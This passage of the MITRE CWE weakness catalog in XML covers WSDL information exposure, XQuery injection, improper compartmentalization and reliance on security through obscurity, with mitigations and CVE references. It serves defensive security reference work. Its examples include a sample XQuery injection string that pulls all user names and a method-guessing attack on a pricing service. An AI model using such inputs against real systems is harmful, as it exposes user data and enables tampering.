         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Name="Web Server" Prevalence="Often"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>The attacker may find sensitive information located in the WSDL file.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Limit access to the WSDL file as much as possible. If services are provided only to a limited number of entities, it may be better to provide WSDL privately to each of these entities than to publish WSDL publicly.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Strategy>Separation of Privilege</Strategy>
               <Description>Make sure that WSDL does not describe methods that should not be publicly accessible. Make sure to protect service methods that should not be publicly accessible with access controls.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Do not use method names in WSDL that might help an adversary guess names of private methods/resources used by the service.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The WSDL for a service providing information on the best price of a certain item exposes the following method: float getBestPrice(String ItemID) An attacker might guess that there is a method setBestPrice (String ItemID, float Price) that is available and invoke that method to try and change the best price of a given item to their advantage. The attack may succeed if the attacker correctly guesses the name of the method, the method does not have proper access controls around it and the service itself has the functionality to update the best price of the item.</Intro_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Content_History>
            <Submission>
               <Submission_Name>Evgeny Lebanidze</Submission_Name>
               <Submission_Organization>Cigital</Submission_Organization>
               <Submission_Date>2008-01-30</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Description, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Enabling_Factors_for_Exploitation, Observed_Examples</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Name, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2010-09-27">Information Leak through WSDL File</Previous_Entry_Name>
			<Previous_Entry_Name Date="2020-02-24">Information Exposure Through WSDL File</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="652" Name="Improper Neutralization of Data within XQuery Expressions ('XQuery Injection')" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The product uses external input to dynamically construct an XQuery expression used to retrieve data from an XML database, but it does not neutralize or incorrectly neutralizes that input. This allows an attacker to control the structure of the query.</Description>
         <Extended_Description>The net effect is that the attacker will have control over the information selected from the XML database and may use that ability to control application flow, modify logic, retrieve unauthorized data, or bypass important checks (e.g. authentication).</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="943" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="91" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>An attacker might be able to read sensitive information from the XML database.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Use parameterized queries. This will help ensure separation between data plane and control plane.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Properly validate user input. Reject data where appropriate, filter where appropriate and escape where appropriate. Make sure input that will be used in XQL queries is safe in that context.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>An attacker may pass XQuery expressions embedded in an otherwise standard XML document. The attacker tunnels through the application entry point to target the resource access layer. The string below is an example of an attacker accessing the accounts.xml to request the service provider send all user names back. doc(accounts.xml)//user[name='*'] The attacks that are possible through XQuery are difficult to predict, if the data is not validated prior to executing the XQL.</Intro_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>46</Entry_ID>
               <Entry_Name>XQuery Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Notes>
            <Note Type="Relationship">This weakness is similar to other weaknesses that enable injection style attacks, such as SQL injection, command injection and LDAP injection. The main difference is that the target of attack here is the XML database.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>Evgeny Lebanidze</Submission_Name>
               <Submission_Organization>Cigital</Submission_Organization>
               <Submission_Date>2008-01-30</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description, Name, Relationship_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Enabling_Factors_for_Exploitation, Modes_of_Introduction, Observed_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-10-14">Unsafe Treatment of XQuery Input</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Failure to Sanitize Data within XQuery Expressions (aka 'XQuery Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-04-05">Failure to Sanitize Data within XQuery Expressions ('XQuery Injection')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="653" Name="Improper Isolation or Compartmentalization" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product does not properly compartmentalize or isolate functionality, processes, or resources that require different privilege levels, rights, or permissions.</Description>
         <Extended_Description>When a weakness occurs in functionality that is accessible by lower-privileged users, then without strong boundaries, an attack might extend the scope of the damage to higher-privileged users.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="657" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="693" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Separation of Privilege</Term>
               <Description>Some people and publications use the term "Separation of Privilege" to describe this weakness, but this term has dual meanings in current usage. This node conflicts with the original definition of "Separation of Privilege" by Saltzer and Schroeder; that original definition is more closely associated with CWE-654. Because there are multiple interpretations, use of the "Separation of Privilege" term is discouraged.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>The exploitation of a weakness in low-privileged areas of the software can be leveraged to reach higher-privileged areas without having to overcome any additional obstacles.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Compare binary / bytecode to application permission manifest</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Attack Modeling</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Break up privileges between different modules, objects, or entities. Minimize the interfaces between modules and require strong access control between them.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>Single sign-on technology is intended to make it easier for users to access multiple resources or domains without having to authenticate each time. While this is highly convenient for the user and attempts to address problems with psychological acceptability, it also means that a compromise of a user's credentials can provide immediate access to all other resources or domains.</Intro_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The traditional UNIX privilege model provides root with arbitrary access to all resources, but root is frequently the only user that has privileges. As a result, administrative tasks require root privileges, even if those tasks are limited to a small area, such as updating user manpages. Some UNIX flavors have a "bin" user that is the owner of system executables, but since root relies on executables owned by bin, a compromise of the bin account can be leveraged for root privileges by modifying a bin-owned executable, such as CVE-2007-4238.</Intro_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
	  <Observed_Examples>
	    <Observed_Example>
	      <Reference>CVE-2019-6260</Reference>
	      <Description>Baseboard Management Controller (BMC) device implements Advanced High-performance Bus (AHB) bridges that do not require authentication for arbitrary read and write access to the BMC's physical address space from the host, and possibly the network [REF-1138].</Description>
	      <Link>https://www.cve.org/CVERecord?id=CVE-2019-6260</Link>
	    </Observed_Example>
	  </Observed_Examples>
         <References>
            <Reference External_Reference_ID="REF-196"/>
            <Reference External_Reference_ID="REF-535"/>
            <Reference External_Reference_ID="REF-1138"/>
         </References>
         <Notes>
            <Note Type="Relationship">There is a close association with CWE-250 (Execution with Unnecessary Privileges). CWE-653 is about providing separate components for each "privilege"; CWE-250 is about ensuring that each component has the least amount of privileges possible. In this fashion, compartmentalization becomes one mechanism for reducing privileges.</Note>
            <Note Type="Terminology">The term "Separation of Privilege" is used in several different ways in the industry, but they generally combine two closely related principles: compartmentalization (this node) and using only one factor in a security decision (CWE-654). Proper compartmentalization implicitly introduces multiple factors into a security decision, but there can be cases in which multiple factors are required for authentication or other mechanisms that do not involve compartmentalization, such as performing all required checks on a submitted certificate. It is likely that CWE-653 and CWE-654 will provoke further discussion.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>Pascal Meunier</Submission_Name>
               <Submission_Organization>Purdue University</Submission_Organization>
               <Submission_Date>2008-01-18</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Common_Consequences, Description, Relationships, Other_Notes, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Other_Notes, Relationship_Notes, Terminology_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Causal_Nature, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Description, Name, Observed_Examples, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2009-01-12">Design Principle Violation: Insufficient Compartmentalization</Previous_Entry_Name>
			<Previous_Entry_Name Date="2021-10-28">Insufficient Compartmentalization</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="656" Name="Reliance on Security Through Obscurity" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product uses a protection mechanism whose strength depends heavily on its obscurity, such that knowledge of its algorithms or key data is sufficient to defeat the mechanism.</Description>
         <Extended_Description>This reliance on "security through obscurity" can produce resultant weaknesses if an attacker is able to reverse engineer the inner workings of the mechanism. Note that obscurity can be one small part of defense in depth, since it can create more work for an attacker; however, it is a significant risk if used as the primary means of protection.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="657" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="693" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="259" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="321" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="472" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Never Assuming your secrets are safe</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Scope>Other</Scope>
               <Impact>Other</Impact>
               <Note>The security mechanism can be bypassed easily.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Always consider whether knowledge of your code or design is sufficient to break it. Reverse engineering is a highly successful discipline, and financially feasible for motivated adversaries. Black-box techniques are established for binary analysis of executables that use obfuscation, runtime analysis of proprietary protocols, inferring file formats, and others.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>When available, use publicly-vetted algorithms and procedures, as these are more likely to undergo more extensive security analysis and testing. This is especially the case with encryption and authentication.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The design of TCP relies on the secrecy of Initial Sequence Numbers (ISNs), as originally covered in CVE-1999-0077 [REF-542]. If ISNs can be guessed (due to predictability, CWE-330) or sniffed (due to lack of encryption during transmission, CWE-312), then an attacker can hijack or spoof connections. Many TCP implementations have had variations of this problem over the years, including CVE-2004-0641, CVE-2002-1463, CVE-2001-0751, CVE-2001-0328, CVE-2001-0288, CVE-2001-0163, CVE-2001-0162, CVE-2000-0916, and CVE-2000-0328.</Intro_Text>
         <References>
                  <Reference External_Reference_ID="REF-542"/>
               </References>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2006-6588</Reference>
               <Description>Reliance on hidden form fields in a web application. Many web application vulnerabilities exist because the developer did not consider that "hidden" form fields can be processed using a modified client.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-6588</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-7142</Reference>
               <Description>Hard-coded cryptographic key stored in executable program.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-7142</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-4002</Reference>
               <Description>Hard-coded cryptographic key stored in executable program.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-4002</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-4068</Reference>
               <Description>Hard-coded hashed values for username and password contained in client-side script, allowing brute-force offline attacks.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-4068</Link>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference External_Reference_ID="REF-196"/>
            <Reference External_Reference_ID="REF-544"/>
            <Reference External_Reference_ID="REF-542"/>
         </References>
         <Notes>
            <Note Type="Relationship">Note that there is a close relationship between this weakness and CWE-603 (Use of Client-Side Authentication). If developers do not believe that a user can reverse engineer a client, then they are more likely to choose client-side authentication in the belief that it is safe.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>Pascal Meunier</Submission_Name>
               <Submission_Organization>Purdue University</Submission_Organization>
               <Submission_Date>2008-01-18</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description, Relationships, Other_Notes, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Other_Notes, Relationship_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Causal_Nature, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships, Time_of_Introduction</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
